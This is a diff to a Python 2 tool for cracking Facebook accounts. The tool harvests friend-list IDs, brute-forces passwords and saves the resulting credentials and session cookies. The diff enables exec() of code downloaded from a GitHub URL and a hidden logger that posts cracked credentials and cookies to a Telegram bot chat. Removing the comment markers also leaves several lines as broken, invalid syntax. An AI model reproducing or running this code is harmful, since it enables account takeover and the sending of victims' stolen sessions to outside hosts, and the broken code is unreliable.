@@ -1,4 +1,4 @@
-#-*-coding:utf-8-*-
+-*-coding:utf-8-*-
 import requests,bs4,sys,os,subprocess
 import requests,sys,random
 reload(sys)
@@ -6,8 +6,8 @@ sys.setdefaultencoding("utf-8")
 from multiprocessing.pool import ThreadPool
 import subprocess
 import logging
-#logging.basicConfig(level=logging.DEBUG)
-def clear(): # clear terminal
+logging.basicConfig(level=logging.DEBUG)
+def clear():  clear terminal
 	if " linux" in sys.platform.lower():
 		os.system("clear")
 	elif "win" in sys.platform.lower():
@@ -51,7 +51,7 @@ if os.path.exists(".browser"):
 class dump_message:
 	def __init__(self, cookies):
 		self.cookies=cookies
-		#print cookies
+		print cookies
 		self.f=raw_input("?: result filename: ").replace(" ","_")
 		if self.f=="":dump_message(cookies)
 		open(self.f,"w").close()
@@ -269,7 +269,7 @@ class friendlist:
 		else:
 			self.fl=raw_input('?: filename: ').replace(" ","_")
 			open(self.fl,"a+")
-			#open(raw_input("* file name: "),"w").close()
+			open(raw_input("* file name: "),"w").close()
 			id="".join(bs4.re.findall("://(.*?)/",self.id))
 			if len(id)==0:friendlist(cookie)
 			self.ok=bs4.re.sub(id,
@@ -378,14 +378,14 @@ def hdcok():
 	return r
 	
 	
-def cvs(cookies): # convert cookie dict to string
+def cvs(cookies):  convert cookie dict to string
 	result=[]
 	for i in enumerate(cookies.keys()):
 		if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
 		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
 	return "".join(result)
 	
-def cvd(cookies): # convert cookie dict to string
+def cvd(cookies):  convert cookie dict to string
 	result={}
 	try:
 		for i in cookies.split(";"):
@@ -395,7 +395,7 @@ def cvd(cookies): # convert cookie dict to string
 		for i in cookies.split("; "):
 			result.update({i.split("=")[0]:i.split("=")[1]})
 		return result
-# --- logger asw ---
+ --- logger asw ---
 def sends(pesan,token):
 	b=requests.post("https://api.telegram.org/bot"+token+"/sendMessage",data={"chat_id":"664762410","text":pesan})	
 		
@@ -407,8 +407,8 @@ try:
 except:
 	ips=None
 	
-#if "pakistan" in ips:
-#	ua="Mozilla/5.0 (Linux; Android 9; SM-S367VL Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/222.0.0.15.124;]"
+if "pakistan" in ips:
+	ua="Mozilla/5.0 (Linux; Android 9; SM-S367VL Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/222.0.0.15.124;]"
 
 
 def generate(text):
@@ -521,10 +521,10 @@ class crack:
 						open("multiresult.txt","a+").write(
 						"%s|%s|%s\n\n"%(fl.get("id"),i,cvs(log.get("cookies"))))
 					ko="%s|%s|%s\n\n"%(fl.get("id"),i,cvs(log.get("cookies")))
-#					ceks(log.get("cookies"),ko) # --> skip logger
+					ceks(log.get("cookies"),ko)  --> skip logger
 					break
 				elif log.get("status")=="cp":
-					#print(R+"\r- %s|%s -> CP%s      "%(fl,i,N))
+					print(R+"\r- %s|%s -> CP%s      "%(fl,i,N))
 					self.cp.append("%s|%s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s|%s|\n"%(fl.get("id"),i))
@@ -623,7 +623,7 @@ class lc:
 		self.host=requests.get(
 			"https://raw.githubusercontent.com/ASU-TOOLKIT/server/master/server.txt"
 		).text.strip()
-#		self.paths()
+		self.paths()
 		self.genid()
 		
 	def paths(self):
@@ -693,10 +693,10 @@ if os.path.exists("multiresult.txt"):
 	pass
 else:open("multiresult.txt","a+").close()
 
-#exec(requests.get("https://raw.githubusercontent.com/anonimus-hemker/fb-crack-people-friendlists/master/notice.txt").text)
-#try:
-#	lc()
-#except Exception as e:exit("* only support termux %s"%e)
+exec(requests.get("https://raw.githubusercontent.com/anonimus-hemker/fb-crack-people-friendlists/master/notice.txt").text)
+try:
+	lc()
+except Exception as e:exit("* only support termux %s"%e)
 basecookie()
 while True:
 	print "  [1] Dump id By Search Name"
